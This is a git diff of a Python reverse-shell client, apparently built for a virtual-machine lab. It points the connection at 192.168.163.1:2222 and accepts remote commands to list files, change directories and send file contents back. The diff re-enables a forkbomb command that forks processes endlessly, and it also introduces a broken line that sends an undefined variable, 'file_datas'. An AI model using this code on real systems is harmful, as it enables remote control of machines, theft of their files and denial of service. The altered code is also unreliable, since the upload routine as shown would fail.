@@ -16,7 +16,7 @@ from time import sleep
 colorama.init(autoreset=True)
 
 #change before install on virtual machine
-RHOST = "127.0.0.1"
+RHOST = "192.168.163.1"
 RPORT = 2222
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -32,12 +32,12 @@ while True:
         # List files in the dir
         if cmd == "list":
             sock.send(str(os.listdir(".")).encode())
-'''
+
         # Forkbomb
         if cmd == "forkbomb":
             while True:
                 os.fork()
-'''
+
         # Change directory
         elif cmd.split(" ")[0] == "cd":
             os.chdir(cmd.split(" ")[1])
@@ -60,7 +60,7 @@ Processor Architecture: {platform.processor()}
                 file_data = f.read(1024)
                 while file_data:
                     print("Sending", file_data)
-                    sock.send(file_data)
+                    sock.send(file_datas)
                     file_data = f.read(1024)
                 sleep(2)
                 sock.send(b"DONE")
